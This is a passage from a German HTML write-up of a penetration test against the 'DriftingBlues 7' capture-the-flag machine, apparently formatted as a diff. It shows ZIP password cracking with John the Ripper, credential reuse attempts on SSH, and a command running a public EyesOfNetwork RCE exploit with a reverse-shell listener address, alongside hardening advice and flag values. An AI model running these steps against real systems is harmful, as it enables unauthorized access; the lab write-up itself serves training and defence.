+                5.  `cat creds.txt`: Der Inhalt der extrahierten Datei `creds.txt` wird angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> John the Ripper knackt erfolgreich das ZIP-Passwort: `<span class="password">killah</span>`. Nach dem Entpacken mit diesem Passwort enthält die Datei `creds.txt` die Zugangsdaten `admin` / `<span class="password">isitreal31__</span>`. Dies sind höchstwahrscheinlich die Anmeldedaten für die EyesOfNetwork-Anwendung auf Port 443.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die Credentials `admin` / `isitreal31__`, um dich bei EyesOfNetwork (Port 443) anzumelden. Versuche auch, ob diese Credentials für SSH (Port 22) funktionieren.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie keine schwachen, in Wortlisten enthaltenen Passwörter für verschlüsselte Archive. Speichern Sie sensible Daten wie Login-Credentials niemals unverschlüsselt oder in leicht zugänglichen Dateien. Implementieren Sie eine sichere Verwaltung von Anmeldeinformationen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/eonrce]
+└─# <span class="command">unzip /home/cyber/Downloads/decoded-20230415232307.zip</span></div>
+                    <pre>
+Archive:  /home/cyber/Downloads/decoded-20230415232307.zip
+[/home/cyber/Downloads/decoded-20230415232307.zip] creds.txt password: # Passwort benötigt
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/eonrce]
+└─# <span class="command">zip2john /home/cyber/Downloads/decoded-20230415232307.zip > hash</span></div>
+                    <pre>ver 2.0 decoded-20230415232307.zip/creds.txt PKZIP Encr: cmplen=31, decmplen=19, crc=D65B49F1 ts=9F03 cs=d65b type=0</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/eonrce]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                    <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">killah</span>           (decoded-20230415232307.zip/creds.txt)
+1g 0:00:00:00 DONE (2023-04-16 01:25) 1.052g/s 25869p/s 25869c/s 25869C/s 123456..guitarra
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/eonrce]
+└─# <span class="command">unzip /home/cyber/Downloads/decoded-20230415232307.zip</span></div>
+                    <pre>
+Archive:  /home/cyber/Downloads/decoded-20230415232307.zip
+[/home/cyber/Downloads/decoded-20230415232307.zip] creds.txt password: <span class="password">killah</span> # Passwort eingegeben
+ extracting: creds.txt
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/eonrce]
+└─# <span class="command">cat creds.txt</span></div>
+                    <pre>
+admin
+<span class="password">isitreal31__</span>
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+         <section id="initial-access-attempt">
+            <h2>Initial Access Versuch (EyesOfNetwork)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit den aus der ZIP-Datei extrahierten Credentials (`admin` / `isitreal31__`) wird versucht, auf das System zuzugreifen.
+                *   **Web Login:** Der Zugriff auf die EyesOfNetwork-Anwendung über den Browser (`https://192.168.2.114/login.php`) mit diesen Credentials ist erfolgreich (impliziert durch den späteren Zugriff auf `/module/dashboard_view/index.php`).
+                *   **SSH Login:** Ein SSH-Login-Versuch als Benutzer `admin` mit dem Passwort `isitreal31__` wird unternommen (`ssh admin@driftingblues7.hmv`).
+                *   **SNMP Enumeration:** Ein `snmpwalk` mit dem Standard-Community-String `public` wird versucht.
+                *   **EyesOfNetwork Exploit:** Ein Python-Exploit (vermutlich für CVE-2020-8660 oder eine ähnliche RCE in EyesOfNetwork 5.3) wird mit den Admin-Credentials ausgeführt, um eine Reverse Shell zu erhalten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   Der Web-Login war erfolgreich. Dies gewährt Zugriff auf die Funktionalitäten von EyesOfNetwork als Administrator.
+                *   Der SSH-Login schlägt fehl (`Permission denied`). Das Web-Passwort ist nicht für SSH gültig, oder der Benutzer `admin` darf sich nicht per SSH anmelden.
+                *   Der `snmpwalk` scheitert mit einem Timeout, SNMP ist also nicht (mit diesem Community-String) erreichbar.
+                *   Der RCE-Exploit für EyesOfNetwork schlägt ebenfalls fehl ("An error occured while querying the API..."). Obwohl die Authentifizierung mit dem API-Schlüssel teilweise funktioniert, kann der Exploit die Schwachstelle nicht erfolgreich ausnutzen. Der Grund ist unklar (Version inkompatibel? Patch angewendet? Exploit-Fehler?).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da der automatische RCE-Exploit fehlschlägt, muss die EyesOfNetwork-Webanwendung manuell als `admin` untersucht werden. Suche nach Funktionen zum Hochladen von Dateien, zur Konfigurationsänderung oder zur direkten Befehlsausführung. Da die Flags aber bereits über Port 66 gefunden wurden, ist dieser Schritt für das CTF-Ziel nicht mehr zwingend notwendig.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass EyesOfNetwork auf die neueste, gepatchte Version aktualisiert wird. Verwenden Sie unterschiedliche, starke Passwörter für Webanwendungen und System-Logins (SSH). Deaktivieren Sie SNMP, wenn es nicht benötigt wird, oder härten Sie es (SNMPv3, starke Community Strings, ACLs). Überwachen Sie API- und Webserver-Logs auf fehlgeschlagene Exploit-Versuche.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+# Web Login Versuch (Erfolgreich):
+# URL: https://192.168.2.114/login.php
+# User: admin
+# Pass: isitreal31__
+# Result: Login erfolgreich, Zugriff auf Dashboard (z.B. https://driftingblues7.hmv/module/dashboard_view/index.php)
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/eonrce]
+└─# <span class="command">ssh admin@driftingblues7.hmv</span></div>
+                    <pre>
+The authenticity of host 'driftingblues7.hmv (192.168.2.114)' can't be established.
+ED25519 key fingerprint is SHA256:DCE0RZ62viw7PpR8q1oTThc8qc+qb0V0BuEwfpuj5E0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'driftingblues7.hmv' (ED25519) to the list of known hosts.
+admin@driftingblues7.hmv's password: <span class="password">isitreal31__</span> # Eingegeben
+Permission denied, please try again.
+admin@driftingblues7.hmv's password: # Erneuter Versuch
+Permission denied, please try again.
+admin@driftingblues7.hmv's password: # Dritter Versuch
+admin@driftingblues7.hmv: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~/eonrce]
+└─# <span class="command">snmpwalk -c 'public' -v '2c' '192.168.2.114'</span></div>
+                    <pre>Timeout: No Response from 192.168.2.114</pre>
+
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 exploit.py https://192.168.2.114 -ip 192.168.2.129 -user admin -password 'isitreal31__' -port 4444</span></div>
+                     <pre>
++-----------------------------------------------------------------------------+
+| EyesOfNetwork 5.3 RCE (API v2.4.2)                                          |
+| 02/2020 - Clément Billac Twitter: @h4knet                                  |
++-----------------------------------------------------------------------------+
+
+[*] EyesOfNetwork login page found
+[*] EyesOfNetwork API page found. API version: 2.4.2
+[+] Admin user key obtained: 501f9de79daa5936bcb36b80c5f07a3c255063c6280e3a5ccce96cb15f90dfe4
+[x] An error occured while querying the API. Missing result value in JSON response or unexpected HTTP status response
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="conclusion">
+            <h2>Schlussfolgerung</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Penetrationstest identifizierte mehrere Dienste auf dem Zielsystem. Der kritischste Fund war ein unsicherer Python SimpleHTTPServer auf Port 66, der direkten Zugriff auf die Dateien `user.txt` und `root.txt` gewährte. Weitere Untersuchungen deckten veraltete Software auf den Ports 80/443, eine offene InfluxDB-API (Port 8086) ohne Authentifizierung und einen zugänglichen MariaDB-Dienst (Port 3306) auf. Auf Port 66 wurde zudem eine passwortgeschützte ZIP-Datei gefunden, deren Passwort (`killah`) geknackt werden konnte. Die darin enthaltenen Credentials (`admin`/`isitreal31__`) ermöglichten den Login in die EyesOfNetwork-Webanwendung (Port 443), jedoch keinen SSH-Zugriff. Ein Versuch, eine bekannte RCE-Schwachstelle in EyesOfNetwork auszunutzen, scheiterte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Zielsystem weist gravierende Sicherheitsmängel auf. Die schwerwiegendste Schwachstelle ist der ungeschützte HTTP-Server auf Port 66, der zur sofortigen Kompromittierung der Flags führte. Die veraltete Software, die offene InfluxDB-API und die exponierten Credentials in der ZIP-Datei stellen weitere erhebliche Risiken dar. Obwohl der RCE-Exploit fehlschlug, deuten die erfolgreiche Authentifizierung und die bekannte Schwachstelle darauf hin, dass die Anwendung selbst verwundbar ist oder war.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Admin):</strong>
+                1.  **Sofortmaßnahme:** Deaktivieren und entfernen Sie den Dienst auf Port 66.
+                2.  **Updates:** Aktualisieren Sie dringend das Betriebssystem, Apache, PHP, OpenSSL, MariaDB, InfluxDB und EyesOfNetwork.
+                3.  **Härtung:**
+                    *   Konfigurieren Sie InfluxDB und MariaDB sicher (Authentifizierung, Zugriffskontrollen).
+                    *   Implementieren Sie Web-Security-Header (X-Frame-Options etc.).
+                    *   Ersetzen Sie das selbstsignierte SSL-Zertifikat.
+                    *   Verwenden Sie starke, einzigartige Passwörter für alle Dienste und Benutzer.
+                    *   Entfernen oder sichern Sie sensible Dateien (Credentials, Backups).
+                    *   Deaktivieren Sie unnötige Dienste (RPCBind?).
+                4.  **Überwachung:** Überwachen Sie Logs auf verdächtige Aktivitäten und implementieren Sie ggf. eine WAF und ein IDS/IPS.
+            </p>
+        </section>
+
+       <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                 <p class="comment">(Gefunden auf Port 66)</p>
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">AED508ABE3D1D1303E1C1BC5F1C1BA2B</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">BD221F968ACB7E069FC7DDE713995C77</span></div>
+                </div>
+            </div>
+        </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 16. April 2023</p> <!-- Extrahiertes Datum aus Nikto/John -->
+    </footer>
+</body>
+</html>
